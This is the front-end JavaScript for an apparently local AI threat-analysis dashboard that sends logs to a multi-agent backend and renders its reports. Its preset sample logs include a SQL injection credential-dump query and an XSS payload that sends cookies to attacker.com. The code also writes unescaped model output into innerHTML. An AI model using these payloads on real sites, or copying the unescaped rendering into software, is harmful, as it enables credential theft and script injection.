// Global State
let systemStatus = {
    ollamaOnline: false,
    gemmaLoaded: false,
    docCount: 0
};

// Preset Logs dictionary
const PRESETS = {
    sqli: `192.168.22.4 - - [27/Jul/2026:11:32:01 +0000] "GET /item.php?id=1%20UNION%20SELECT%20null,CONCAT(username,0x3a,password)%20FROM%20users HTTP/1.1" 200 1342 "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"`,
    xss: `192.168.10.15 - - [27/Jul/2026:11:35:45 +0000] "POST /guestbook.php HTTP/1.1" 200 450 "user_name=attacker&comment=<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"`,
    bruteforce: `2026-07-27T10:10:01Z - SSH Login Fail: user admin from 203.0.113.50\n2026-07-27T10:10:03Z - SSH Login Fail: user admin from 203.0.113.50\n2026-07-27T10:10:05Z - SSH Login Fail: user admin from 203.0.113.50\n2026-07-27T10:10:08Z - SSH Login Success: user admin from 203.0.113.50`,
    ransomware: `Security Alert: System 'HOST-PC-40' infected. Process: C:\\Users\\Public\\updater.exe. Crypto activity detected. Files encrypted with extension '.wannacry'. Found Ransom Note readme file. Outbound Tor network activity detected.`,
    cve: `Explain CVE-2024-3400. What is it, which vendors does it affect, and what are the recommended actions?`
};

let currentSynthesizedReport = "";

// Initialize App
document.addEventListener("DOMContentLoaded", () => {
    // 1. Initial Status Check
    checkSystemStatus();
    setInterval(checkSystemStatus, 8000); // Check status every 8s
    
    // 2. Setup Navigation tabs listener
    const navItems = document.querySelectorAll(".nav-item");
    navItems.forEach(item => {
        item.addEventListener("click", () => {
            const tabId = item.getAttribute("data-tab");
            switchTab(tabId);
        });
    });
});

// Switch Tab logic
function switchTab(tabId) {
    // Update active nav links
    const navItems = document.querySelectorAll(".nav-item");
    navItems.forEach(item => {
        if (item.getAttribute("data-tab") === tabId) {
            item.classList.add("active");
        } else {
            item.classList.remove("active");
        }
    });

    // Update active tab containers
    const tabContents = document.querySelectorAll(".tab-content");
    tabContents.forEach(content => {
        if (content.id === `${tabId}-tab`) {
            content.classList.add("active");
        } else {
            content.classList.remove("active");
        }
    });

    // Update Page Header Titles
    const titleText = document.getElementById("tab-title-text");
    const subtitleText = document.getElementById("tab-subtitle-text");
    
    const titles = {
        dashboard: { t: "Dashboard", s: "Overview of local threat analytics and agent systems." },
        analyst: { t: "Agent Threat Analyst", s: "Run reasoning, threat classifications and MITRE alignments." },
        ingest: { t: "Data Ingestion Portal", s: "Load custom files and security catalogs to vector database." },
        benchmark: { t: "System Test Bench", s: "Run benchmark scenarios and evaluate metrics." },
        docs: { t: "System Documentation", s: "Step-by-step setup guides and external datasets details." }
    };

    if (titles[tabId]) {
        titleText.innerText = titles[tabId].t;
        subtitleText.innerText = titles[tabId].s;
    }
}

// Check backend status
async function checkSystemStatus() {
    try {
        const response = await fetch("/api/status");
        if (!response.ok) throw new Error("Server unhealthy");
        const data = await response.json();
        
        // Update state
        systemStatus.ollamaOnline = data.ollama.status === "online";
        systemStatus.llmLoaded = data.ollama.gpt_oss_loaded || data.ollama.llm_loaded || data.ollama.gemma_loaded;
        systemStatus.docCount = data.vector_db.document_count;
        
        // Update header UI
        updateBadge("ollama", systemStatus.ollamaOnline ? "green" : "red", systemStatus.ollamaOnline ? "ONLINE" : "OFFLINE");
        
        const badgeId = document.getElementById("llm-status-dot") ? "llm" : "gemma";
        updateBadge(badgeId, systemStatus.llmLoaded ? "green" : (systemStatus.ollamaOnline ? "orange" : "red"), systemStatus.llmLoaded ? "LOADED" : (systemStatus.ollamaOnline ? "PULL NEEDED" : "OFFLINE"));
        
        const dbText = document.getElementById("db-count-text");
        if (dbText) dbText.innerText = `${systemStatus.docCount} chunks`;
        const dbDot = document.getElementById("db-status-dot");
        if (dbDot) dbDot.className = "status-dot green";
        
        // Update Dashboard Statistics
        const dashDb = document.getElementById("dash-db-count");
        if (dashDb) dashDb.innerText = systemStatus.docCount;
        const dashModels = document.getElementById("dash-models-count");
        if (dashModels) dashModels.innerText = data.ollama.models_installed.length;
        const dashOllama = document.getElementById("dash-ollama-url");
        if (dashOllama) dashOllama.innerText = data.ollama.url.replace("http://", "");
        const dashEmbed = document.getElementById("dash-embed-model");
        if (dashEmbed) dashEmbed.innerText = "nomic-embed-text";
        
        const reasoningEngineText = document.getElementById("dash-reasoning-engine");
        if (reasoningEngineText) {
            reasoningEngineText.innerText = data.ollama.configured_llm;
            if (systemStatus.llmLoaded) {
                reasoningEngineText.style.color = "var(--success)";
            } else {
                reasoningEngineText.style.color = "var(--warning)";
            }
        }
    } catch (e) {
        console.error("Status check failed:", e);
        updateBadge("ollama", "red", "OFFLINE");
        const badgeId = document.getElementById("llm-status-dot") ? "llm" : "gemma";
        updateBadge(badgeId, "red", "OFFLINE");
        const dbText = document.getElementById("db-count-text");
        if (dbText) dbText.innerText = "Offline";
        const dbDot = document.getElementById("db-status-dot");
        if (dbDot) dbDot.className = "status-dot red";
    }
}

function updateBadge(idPrefix, color, text) {
    const cleanPrefix = idPrefix.replace(/-status$/, "");
    const dot = document.getElementById(`${cleanPrefix}-status-dot`) || document.getElementById(`${idPrefix}-status-dot`) || document.getElementById(`${idPrefix}-dot`);
    const label = document.getElementById(`${cleanPrefix}-status-text`) || document.getElementById(`${idPrefix}-status-text`) || document.getElementById(`${idPrefix}-text`);
    if (dot) {
        dot.className = `status-dot ${color}`;
    }
    if (label) {
        label.innerText = text;
    }
}

// Load Preset Log into Input
function loadPreset(presetKey) {
    const textarea = document.getElementById("log-input");
    if (PRESETS[presetKey]) {
        textarea.value = PRESETS[presetKey];
    }
}

// Show/Hide Loader Spinner
function showLoader(title, subtitle) {
    const overlay = document.getElementById("loading-overlay");
    document.getElementById("loader-title").innerText = title;
    document.getElementById("loader-subtitle").innerText = subtitle;
    overlay.classList.add("active");
}

function hideLoader() {
    const overlay = document.getElementById("loading-overlay");
    overlay.classList.remove("active");
}

// Run Agent Threat Analysis
async function runAnalysis() {
    const logText = document.getElementById("log-input").value.trim();
    if (!logText) {
        alert("Please enter security logs or text to analyze.");
        return;
    }

    showLoader("Orchestrating 4-Agent Pipeline...", "Planning Agent analyzing request and generating roadmap (Phase 1)");
    
    // Progress messages in spinner for the 4-agent stages
    const step1Timer = setTimeout(() => {
        const el = document.getElementById("loader-subtitle");
        if (el) el.innerText = "Research Agent querying ChromaDB RAG & extracting IOCs (Phase 2)";
    }, 1500);

    const step2Timer = setTimeout(() => {
        const el = document.getElementById("loader-subtitle");
        if (el) el.innerText = "Validation Agent verifying threat indicators & mapping MITRE ATT&CK (Phase 3)";
    }, 3500);

    const step3Timer = setTimeout(() => {
        const el = document.getElementById("loader-subtitle");
        if (el) el.innerText = "Execution Agent compiling containment playbooks & executive report (Phase 4)";
    }, 5500);

    try {
        const response = await fetch("/api/analyze", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ query: logText })
        });
        
        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.detail || "Server failed to process analysis request");
        }
        
        const data = await response.json();
        
        // 1. Render Multi-Agent Protocol Logs
        renderAgentLogs(data.communication_logs);
        
        // 2. Render Final Synthesized Markdown Report
        currentSynthesizedReport = data.report;
        document.getElementById("report-output").innerHTML = parseMarkdown(data.report);
        
        // Auto-refresh DB count just in case
        checkSystemStatus();
    } catch (e) {
        alert(`Analysis Error: ${e.message}`);
    } finally {
        clearTimeout(step1Timer);
        clearTimeout(step2Timer);
        clearTimeout(step3Timer);
        hideLoader();
    }
}

// Render the Agent-to-Agent Logs (Multi-Agent Protocol)
function renderAgentLogs(logs) {
    const container = document.getElementById("agent-flow-logs");
    container.innerHTML = "";
    
    if (!logs || logs.length === 0) {
        container.innerHTML = `<div style="color: var(--text-muted); font-size: 0.9rem; text-align: center; padding: 2rem 0;">No communications logged.</div>`;
        return;
    }
    
    const agentIcons = {
        "Planning Agent": "📋",
        "Research Agent (RAG)": "🔎",
        "Research Agent": "🔎",
        "Validation Agent": "🛡️",
        "Execution Agent": "⚡",
        "Orchestrator": "🎛️"
    };

    logs.forEach(log => {
        const isRequest = log.objective !== undefined;
        const sender = log.sender;
        const receiver = log.receiver;
        const sIcon = agentIcons[sender] || "🤖";
        const rIcon = agentIcons[receiver] || "🤖";
        
        const card = document.createElement("div");
        card.className = "agent-msg-card";
        
        if (isRequest) {
            card.innerHTML = `
                <div class="agent-msg-header">
                    <span class="agent-name" style="color: var(--secondary)">${sIcon} ${sender} ➔ ${rIcon} ${receiver}</span>
                    <span class="agent-direction">Task Dispatched</span>
                </div>
                <div style="font-weight: 500; margin-bottom: 0.25rem;">Objective: ${log.objective}</div>
                <div class="agent-msg-body">Payload Context:\n${log.context}\n\nGrounding / Knowledge:\n${log.knowledge}</div>
            `;
        } else {
            const statusColor = log.status === "success" ? "var(--success)" : "var(--danger)";
            card.innerHTML = `
                <div class="agent-msg-header">
                    <span class="agent-name" style="color: ${statusColor}">↩️ ${sIcon} ${sender} ➔ ${rIcon} ${receiver}</span>
                    <span class="agent-direction" style="color: ${statusColor}">Result Returned</span>
                </div>
                <div style="display: flex; gap: 1rem; margin-bottom: 0.25rem;">
                    <span>Status: <strong style="color: ${statusColor}">${(log.status || "SUCCESS").toUpperCase()}</strong></span>
                    <span>Confidence: <strong>${Math.round((log.confidence || 0.9) * 100)}%</strong></span>
                </div>
                <div class="agent-msg-body">Result Data:\n${JSON.stringify(log.result, null, 2)}</div>
            `;
        }
        container.appendChild(card);
    });
}

// Ingest File upload
async function uploadFile(file) {
    if (!file) return;
    
    const size = document.getElementById("chunk-size").value;
    const overlap = document.getElementById("chunk-overlap").value;
    
    const formData = new FormData();
    formData.append("file", file);
    formData.append("chunk_size", size);
    formData.append("overlap", overlap);
    
    showLoader("Ingesting Document...", `Uploading and chunking ${file.name}`);
    
    try {
        const response = await fetch("/api/ingest", {
            method: "POST",
            body: formData
        });
        
        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.detail || "Upload failed");
        }
        
        const data = await response.json();
        alert(`Success! File parsed into ${data.chunks_created} chunks and indexed in vector store.`);
        checkSystemStatus();
    } catch(e) {
        alert(`Upload error: ${e.message}`);
    } finally {
        hideLoader();
    }
}

// Crawl directory
async function crawlDirectory() {
    const pathInput = document.getElementById("dir-path-input").value.trim();
    if (!pathInput) {
        alert("Please specify a directory path.");
        return;
    }
    
    showLoader("Crawling Directory...", "Indexing files recursively in background (Phase 2 & 3)");
    
    try {
        const response = await fetch("/api/ingest-directory", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ directory_path: pathInput })
        });
        
        if (!response.ok) {
            const err = await response.json();
            throw new Error(err.detail || "Failed to scan folder");
        }
        
        const data = await response.json();
        alert(`Finished indexing directory!\nFiles read: ${data.files_indexed.length}\nVector chunks added: ${data.total_chunks_created}`);
        checkSystemStatus();
    } catch (e) {
        alert(`Crawl failed: ${e.message}`);
    } finally {
        hideLoader();
    }
}

// Reset ChromaDB Database
async function resetDatabase() {
    if (!confirm("Are you sure you want to clear the entire vector database? This action is permanent!")) return;
    
    showLoader("Clearing Database...", "Resetting ChromaDB collections");
    
    try {
        const response = await fetch("/api/db-reset", { method: "POST" });
        if (!response.ok) throw new Error("Reset call failed");
        alert("Vector database collection wiped clean.");
        checkSystemStatus();
    } catch(e) {
        alert(`DB Clear error: ${e.message}`);
    } finally {
        hideLoader();
    }
}

// Run Automated Benchmarking (Phase 9)
async function runBenchmark() {
    showLoader("Running Test Bench...", "Simulating all 8 cybersecurity scenarios through agents. Please wait, this takes a moment.");
    
    try {
        const response = await fetch("/api/test-bench", { method: "POST" });
        if (!response.ok) throw new Error("Bench test failed");
        const data = await response.json();
        
        // Show results grid
        document.getElementById("bench-results-section").style.display = "grid";
        
        // Populate stats
        document.getElementById("stat-accuracy").innerText = `${data.accuracy_rate}%`;
        document.getElementById("stat-accuracy").className = data.accuracy_rate >= 80 ? "badge badge-success" : "badge badge-warning";
        
        document.getElementById("stat-latency").innerText = `${data.average_latency_seconds}s`;
        document.getElementById("stat-rag-hits").innerText = `${data.retrieval_rate}%`;
        document.getElementById("stat-hallucinations").innerText = data.hallucination_rate === 0 ? "0 Alerts" : `${data.hallucination_rate}%`;
        document.getElementById("stat-hallucinations").className = data.hallucination_rate === 0 ? "badge badge-success" : "badge badge-danger";
        
        // Populate Table rows
        const tbody = document.getElementById("bench-table-body");
        tbody.innerHTML = "";
        
        data.results.forEach(res => {
            const tr = document.createElement("tr");
            tr.innerHTML = `
                <td><strong>${res.name}</strong></td>
                <td><code>${res.expected_classification}</code></td>
                <td><code>${res.actual_classification}</code></td>
                <td>${res.latency_seconds}s</td>
                <td>
                    <span class="badge ${res.is_accurate ? 'badge-success' : 'badge-danger'}">
                        ${res.is_accurate ? 'PASSED' : 'MISSED'}
                    </span>
                </td>
                <td>
                    <span class="badge ${res.has_retrieval ? 'badge-info' : 'badge-secondary'}">
                        ${res.has_retrieval ? 'FOUND' : 'NONE'}
                    </span>
                </td>
            `;
            tbody.appendChild(tr);
        });
        
    } catch(e) {
        alert(`Benchmark run failed: ${e.message}`);
    } finally {
        hideLoader();
    }
}

// Download markdown security report
function downloadReport() {
    if (!currentSynthesizedReport) {
        alert("No compiled report exists. Run an analysis first.");
        return;
    }
    const blob = new Blob([currentSynthesizedReport], { type: "text/markdown" });
    const a = document.createElement("a");
    a.href = URL.createObjectURL(blob);
    a.download = `sentinelai-threat-report-${Math.floor(Date.now()/1000)}.md`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
}

// Simple custom Markdown to HTML parser
function parseMarkdown(md) {
    if (!md) return "";
    
    let html = md;
    
    // Convert headers
    html = html.replace(/^# (.*?)$/gm, '<h1>$1</h1>');
    html = html.replace(/^## (.*?)$/gm, '<h2>$1</h2>');
    html = html.replace(/^### (.*?)$/gm, '<h3>$1</h3>');
    
    // Convert horizontal rules
    html = html.replace(/^---$/gm, '<hr style="border: 0; height: 1px; background: var(--border-color); margin: 1.5rem 0;">');
    
    // Convert bold text
    html = html.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
    
    // Convert list items
    html = html.replace(/^\- (.*?)$/gm, '<li>$1</li>');
    
    // Wrap lists in ul
    // Find groups of li and wrap them
    html = html.replace(/(<li>.*?<\/li>)+/gs, (match) => `<ul style="margin-left: 1.5rem; margin-bottom: 1rem; color: #cbd5e1;">${match}</ul>`);
    
    // Convert inline code
    html = html.replace(/`(.*?)`/g, '<code>$1</code>');
    
    // Convert code blocks
    html = html.replace(/```(.*?)\n(.*?)```/gs, '<pre style="background: rgba(0,0,0,0.4); padding: 1rem; border-radius: 8px; border: 1px solid var(--border-color); font-family: var(--font-mono); font-size: 0.85rem; color:#f8fafc; overflow-x:auto;">$2</pre>');
    
    // Clean up empty double paragraphs
    html = html.split('\n\n').map(p => {
        p = p.trim();
        if (!p) return "";
        if (p.startsWith('<h') || p.startsWith('<u') || p.startsWith('<l') || p.startsWith('<p') || p.startsWith('<pre') || p.startsWith('<hr')) {
            return p;
        }
        return `<p style="margin-bottom: 1rem; color: #cbd5e1; font-size:0.95rem;">${p}</p>`;
    }).join('\n');

    return html;
}
